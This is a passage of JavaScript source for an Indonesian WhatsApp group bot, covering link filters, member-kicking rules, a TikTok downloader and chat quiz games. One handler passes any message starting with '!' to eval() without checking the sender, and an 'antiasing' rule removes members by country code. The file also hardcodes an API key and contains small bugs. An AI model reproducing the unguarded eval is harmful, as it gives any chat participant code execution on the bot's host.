$('#primary > div > div > ul > li > article').each(function (a, b) {
hasil2.push({
title: $(b).find('header > h2').text(),
link: $(b).find('header > h2 > a').attr('href'),
category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
type: $(b).find('source').attr('type') || 'image/jpeg',
video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
video_2: $(b).find('video > a').attr('href') || ''
})
})
resolve(hasil2)
})
})
}
//==================================================//
if (!slime.public) {
if (!m.key.fromMe) return
}
let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
slime.sendPresenceUpdate('available', m.chat)
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m SlimexTzy \x1b[1;37m]', time, chalk.green(budy || m.mtype), 'Dari', chalk.blue(pushname), 'Di', chalk.yellow(groupName ? groupName : 'Private Chat' ), 'args :', chalk.white(args.length))
            }
           

     
// Anti Link

if (AntiLink) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotAdmins) return reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await slime.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return slime.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke group ini`})
if (isAdmins) return slime.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isCreator) return slime.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
await slime.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant 
}
})
slime.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
slime.sendMessage(from, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
}

 // Antiwame by LynnZxD
if (AntiWame)
if (chath.match(/(wa.me\/)/gi)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\nAdmin sudah kirim link wa.me, admin bebas kirim link apapun`
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await slime.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*slime.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
slime.sendMessage(from, {text:`\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\n@${kice.split("@")[0]} Jangan kirim wa.me link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
//antivirtex by LynnZxD
  if (AntiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return m.reply(mess.botAdmin)
  await slime.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
slime.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
slime.sendMessage(from, {text:`\`\`\`「 Virus Terdeteksi 」\`\`\`\n\n${pushname} Telah ditendang karena mengirim virus di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti bad words by LynnZxD


//antiasing by LynnZxD
if (m.isGroup && isBotAdmins && AntiAsing) {
let member = await participants.map((x) => x.id)
for (let i = 0; i < participants.length; i++) {
if (member[i].slice(0, 2) !== "62") {
let usersId = await participants.find((u) => u.id == member[i])
if (!usersId.groupAdmins && !isCreator) {
} else
await slime.groupParticipantsUpdate(m.chat, [member[i]], "remove")
await sleep(1000)
}
}
}
//antilink youtube video by LynnZxD
if (AntiLinkYoutubeVid)
if (chath.match(/(youtu.be\/)/gi)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 YouTube Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun `
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await slime.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*slime.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
slime.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube video link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by LynnZxD
if (AntiLinkYoutubeChannel)
if (chath.match(/(youtube.com\/)/gi)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 YouTube Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun `
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await slime.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*slime.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
slime.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube channel link di group ini`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
//antilink instagram by slimextzy
if (AntiLinkInstagram)
if (chath.match(/(instagram.com\/)/gi)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun `
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await slime.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*slime.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
slime.sendMessage(from, {text:`\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim instagram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by slimextzy
if (AntiLinkFacebook)
if (chath.match(/(facebook.com\/)/gi)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun `
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await slime.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*slime.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
slime.sendMessage(from, {text:`\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim facebook link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by slimextzy
if (AntiLinkTelegram)
if (chath.match(/(t.me\/)/gi)) {
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun `
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await slime.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*slime.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
slime.sendMessage(from, {text:`\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim telegram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
	// Tebak Bomb
		let pilih = '🌀', bomb = '💣';
		if (m.sender in tebakbom) {
			if (!/^[1-9]|10$/i.test(body) && !isCmd && !isCreator) return !0;
			if (tebakbom[m.sender].petak[parseInt(body) - 1] === 1) return !0;
			if (tebakbom[m.sender].petak[parseInt(body) - 1] === 2) {
				tebakbom[m.sender].board[parseInt(body) - 1] = bomb;
				tebakbom[m.sender].pick++;
				slime.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
				tebakbom[m.sender].bomb--;
				tebakbom[m.sender].nyawa.pop();
				let brd = tebakbom[m.sender].board;
				if (tebakbom[m.sender].nyawa.length < 1) {
					db.data.users[sender].limit -= 3
					await m.reply(`*GAME TELAH BERAKHIR*\nKamu terkena bomb\n\n ${brd.join('')}\n\n*Terpilih :* ${tebakbom[m.sender].pick}\n_Pengurangan Limit : 2_`);
					slime.sendMessage(m.chat, {react: {text: '😂', key: m.key}})
					delete tebakbom[m.sender];
				} else await m.reply(`*PILIH ANGKA*\n\nKamu terkena bomb\n ${brd.join('')}\n\nTerpilih: ${tebakbom[m.sender].pick}\nSisa nyawa: ${tebakbom[m.sender].nyawa}`);
				return !0;
			}
			if (tebakbom[m.sender].petak[parseInt(body) - 1] === 0) {
				tebakbom[m.sender].petak[parseInt(body) - 1] = 1;
				tebakbom[m.sender].board[parseInt(body) - 1] = pilih;
				tebakbom[m.sender].pick++;
				tebakbom[m.sender].lolos--;
				let brd = tebakbom[m.sender].board;
				if (tebakbom[m.sender].lolos < 1) {
					db.data.users[m.sender].limit += 20
					await m.reply(`*KAMU HEBAT ಠ⁠ᴥ⁠ಠ*\n\n${brd.join('')}\n\n*Terpilih :* ${tebakbom[m.sender].pick}\n*Sisa nyawa :* ${tebakbom[m.sender].nyawa}\n*Bomb :* ${tebakbom[m.sender].bomb}\n*Hadiah :* limit 20`);
					delete tebakbom[m.sender];
				} else m.reply(`*PILIH ANGKA*\n\n${brd.join('')}\n\nTerpilih : ${tebakbom[m.sender].pick}\nSisa nyawa : ${tebakbom[m.sender].nyawa}\nBomb : ${tebakbom[m.sender].bomb}`)
			}
		}
		
		//
slime.family100 = slime.family100 ? slime.family100 : {};
if (from in slime.family100 && !m.key.fromMe ) {
    let similarity = require('similarity');
    let threshold = 0.72; // semakin tinggi nilai, semakin mirip
    let id = m.chat;
    let users = global.db.data.users[m.sender];
    let room = slime.family100[id];
    let text = budy.toLowerCase().replace(/[^\w\s\-]+/, '');
    let isSurrender = /^((me)?nyerah|surr?ender)$/i.test(budy);
    if (!isSurrender) {
        let index = room.jawaban.indexOf(text);
        if (index < 0) {
            if (Math.max(...room.jawaban.filter((_, index) => !room.terjawab[index]).map(jawaban => similarity(jawaban, text))) >= threshold) {
                return reply('Dikit lagi!');
            }
        }
        if (!isCmd && room.terjawab[index]) {
            return;
        }
        users.limit += room.winScore;
        room.terjawab[index] = m.sender;
    }
    let isWin = room.terjawab.length === room.terjawab.filter(v => v).length;
    let caption = `*GAME FAMILY100*
*Soal:* ${room.soal}
Terdapat ${room.jawaban.length} jawaban${room.jawaban.find(v => v.includes(' ')) ? `
(beberapa jawaban terdapat spasi)
`: ''}
${isWin ? `*SEMUA JAWABAN TERJAWAB ✅*` : isSurrender ? '*MENYERAH ❌*' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
    return isSurrender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '✓ ' + room.terjawab[index].split('@')[0] : ''}`.trim() : false;
}).filter(v => v).join('\n')}
${isSurrender ? '' : `+${room.winScore} Limit tiap jawaban benar`}
    `.trim();
    slime.sendMessage(from, { text: `${caption}`, mentions: [room.terjawab + '@s.whatsapp.net'] }, { quoted: m }).then(msg => {
        slime.family100[id].msg = msg;
    }).catch(_ => _);
    if (isWin || isSurrender) {
        delete slime.family100[id];
    }
}
			//
		slime.tebakkata = slime.tebakkata ? slime.tebakkata : {}  
if (from in slime.tebakkata) {
let id = m.chat
let users = global.db.data.users[m.sender]
let json = JSON.parse(JSON.stringify(slime.tebakkata[id][1]))
kuis = true
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
 db.data.users[m.sender].limit += 20
 var teks = `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\nHadiah : 20 limit\n`
 reply(`${teks}`)
 clearTimeout(slime.tebakkata[id][2])
 delete slime.tebakkata[id]
} else console.log('*Jawaban Salah!*')
}
//antilink tiktok by slimextzy
if (AntiLinkTiktok)
if (chath.match(/(tiktok.com\/)/gi)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun `
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await slime.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*slime.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
slime.sendMessage(from, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim tiktok link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by slimextzy
if (AntiLinkTwitter)
if (chath.match(/(twitter.com\/)/gi)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun `
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await slime.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*slime.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
slime.sendMessage(from, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim twitter link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink all by slimextzy
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await slime.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant 
}
})
slime.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
slime.sendMessage(from, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
         //FUNCTION DEPOSIT
         
         /** antispam **/
if (isCmd && antiSpam.isFiltered(from) && !m.isGroup) {
console.log(color('[ SPAM ]', 'red'), color('yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
return m.reply('「 ❗ 」Beri Jeda 5 Detik Dek')
}

if (isCmd && antiSpam.isFiltered(from) && m.isGroup) {
console.log(color('[ SPAM ]', 'red'), color('yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
return m.reply('「 ❗ 」Beri Jeda 5 Detik Dek')
}

if (isCmd && !isCreator) antiSpam.addFilter(from)

// Auto download tiktok
  if (budy.startsWith('keiwhiehejej') || budy.startsWith('https://www.tiktok.com/') || budy.startsWith('https://t.tiktok.com/') || budy.startsWith('https://vm.tiktok.com/')) {
    try {
    const data = await fetchJson(`https://api.tiklydown.eu.org/api/download/v3?url=${encodeURIComponent(budy)}`);
    const stats = data.result.statistics;
const caption = `⫹┈──────────────────────⫺
            *T I K T O K A U T O D L*
⫹┈──────────────────────⫺\n*Author*: ${data.result.author.nickname}\n*Like*: ${data.result.statistics.likeCount}\n*Komentar*: ${data.result.statistics.commentCount}\n*Share*: ${data.result.statistics.shareCount}\n*Title*: ${data.result.desc}\n\n_Download By ${global.botname}_`;
const vidnya = data.result.video;
    slime.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m });
} catch (error) {
    const anub = await fetchJson(`https://api.miftahganzz.my.id/api/download/tiktokv3?url=${encodeURIComponent(budy)}&apikey=miftah`);
    const syavid = anub.data.video;
    slime.sendMessage(m.chat, { caption: mess.success, video: { url: syavid } }, { quoted: m });
}
  }
  
  if (antibot) {
    if (m.isBaileys && m.fromMe == true){
        if (isAdmins || !isBotAdmins){		  
        } else {
          reply(`*Bot Lain Terdeteksi*\n\nHusshhh Keluar dari group ini!!!`)
    return await slime.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
   }
   
   async function ephoto(url, texk) {
let form = new FormData()
let gT = await axios.get(url, {
headers: {
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
}
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios.post(url, form, {
headers: {
...form.getHeaders(),
Accept: "*/*",
"Accept-Language": "en-US,en;q=0.9",
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
cookie: gT.headers["set-cookie"]?.join("; "),
}
});

//=================================================//
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
headers: {
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
cookie: gT.headers["set-cookie"].join("; ")
}
})
return build_server + data.image
}
  
// FITUR MENGETIK
if (global.autoTyping) {
if (command) { slime.sendPresenceUpdate('composing', from)}}

// AUTO READ MESSAGE
if (global.autoTyping) {
if (command) { slime.readMessages([m.key])}}

//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: slime.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, slime.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
slime.ev.emit('messages.upsert', msg)
}
//=================================================//
if (budy.startsWith('!')) {
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
//==================================================//
try {
ppuser = await slime.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {
    let isNumber = x => typeof x === 'number' && !isNaN(x)
    let limitUser = isPrem ? 1000 : 15
    let user = global.db.data.users[m.sender]
    
    if (typeof user !== 'object') global.db.data.users[m.sender] = {}
    
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
} 

let isNumber = x => typeof x === 'number' && !isNaN(x)
let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
                if (!isNumber(setting.status)) setting.status = 0
                if (autobio) {
        let _uptime = process.uptime() * 1000
		let uptime = clockString(_uptime)
		await slime.updateProfileStatus(`I am ${botname} | Aktif Selama ${uptime} ⏳ | Mode : ${slime.public ? 'Public-Mode' : 'Self-Mode'}`).catch(_ => _)
        }
if (autoread) {
slime.readMessages([m.key])
        }
        
            } else global.db.data.settings[botNumber] = {
                status: 0,
                autobio: false,
                autoread: false
            }
            //=================================================//


//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
m.reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== from)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = from
if (room.x !== room.o) await slime.sendText(room.x, str, m, { mentions: parseMention(str) } )
await slime.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}
//GAME
slime.susunkata = slime.susunkata ? slime.susunkata : {}  
if(from in slime.susunkata){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.data.users[m.sender]
 let json = JSON.parse(JSON.stringify(slime.susunkata[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.limit += slime.susunkata[id][2]
   var teks = `*GAME SUSUN KATA*\n\nJawaban Kamu Benar!\n Hadiah : +${slime.susunkata[id][2]} Limit`
reply(`${teks}`)
 clearTimeout(slime.susunkata[id][3])
 delete slime.susunkata[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) reply(`*Dikit Lagi!*`)
// else reply(`*Salah!*`)
 
}
//
if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 slime.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}
//
slime.tebaktebakan = slime.tebaktebakan ? slime.tebaktebakan : {};
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 slime.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik .tebaktebakan`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}
//
slime.tekateki = slime.tekateki ? slime.tekateki : {}  
if(from in slime.tekateki){
let users = global.db.data.users[m.sender]
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(slime.tekateki[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.limit += slime.tekateki[id][2]
 var teks = `*GAME TEKATEKI*\n\nJawaban Kamu Benar!\n Hadiah : +${slime.tekateki[id][2]} Limit`
 reply(`${teks}`)
 clearTimeout(slime.tekateki[id][3])
 delete slime.tekateki[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) reply(`*Dikit Lagi!*`)
}
//
slime.tebakgambar = slime.tebakgambar ? slime.tebakgambar : {} 
if(from in slime.tebakgambar) {
kuis = true
let id = m.chat
let users = global.db.data.users[m.sender]
let json = JSON.parse(JSON.stringify(slime.tebakgambar[id][1]))
 if (budy.toLowerCase() == json.name.toLowerCase().trim()) {
   db.data.users[m.sender].limit += 5
 var teks = `🎮 Tebak Member JKT48 🎮\n\nJawaban Benar 🎉\nHadiah : 5 limit\n\nIngin bermain lagi? Silahkan Ketik tebakgambar`
 reply(`${teks}`)
 clearTimeout(slime.tebakgambar[id][3])
 delete slime.tebakgambar[id]
} else console.log('*Jawaban Salah!*')
}
//
slime.tebakjkt48 = slime.tebakjkt48 ? slime.tebakjkt48 : {} 
if(from in slime.tebakjkt48) {
kuis = true
let id = m.chat
let users = global.db.data.users[m.sender]
let json = JSON.parse(JSON.stringify(slime.tebakjkt48[id][1]))
 if (budy.toLowerCase() == json.name.toLowerCase().trim()) {
   db.data.users[m.sender].limit += 5
 var teks = `🎮 Tebak Member JKT48 🎮\n\nJawaban Benar 🎉\nHadiah : 5 limit\n\nIngin bermain lagi? Silahkan Ketik tebakjkt48`
 reply(`${teks}`)
 clearTimeout(slime.tebakjkt48[id][3])
 delete slime.tebakjkt48[id]
} else console.log('*Jawaban Salah!*')
}

//
slime.tebaklirik = slime.tebaklirik ? slime.tebaklirik : {}  
if(from in slime.tebaklirik){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.data.users[m.sender]
let json = JSON.parse(JSON.stringify(slime.tebaklirik[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.limit += slime.tebaklirik[id][2]
   var teks = `*GAME TEBAK LIRIK*\n\nJawaban Kamu Benar!\n Hadiah : +${slime.tebaklirik[id][2]} Limit`
  reply(`${teks}`)
 clearTimeout(slime.tebaklirik[id][3])
 delete slime.tebaklirik[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) reply(`*Dikit Lagi!*`)
// else reply(`*Salah!*`)
 }
//
slime.siapaaku = slime.siapaaku ? slime.siapaaku : {}
if(from in slime.siapaaku){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.data.users[m.sender]
 let json = JSON.parse(JSON.stringify(slime.siapaaku[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += slime.siapaaku[id][2]
var teks = `*GAME SIAPAKAH AKU*\n\nJawaban Kamu Benar!\n Hadiah : +${slime.siapaaku[id][2]} Limit`
   reply(`${teks}`)
 clearTimeout(slime.siapaaku[id][3])
 delete slime.siapaaku[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) reply(`*Dikit Lagi!*`)
// else reply(`*Salah!*`) 
}
//tebakkabu
 if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkabupaten[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await reply('*Anda Telah menyerah*')
delete tebakkabupaten[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await slime.sendText(m.chat, `🎮 Tebak Kabupaten 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkabupaten[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
slime.sendTextWithMentions(from, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
slime.sendText(from, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
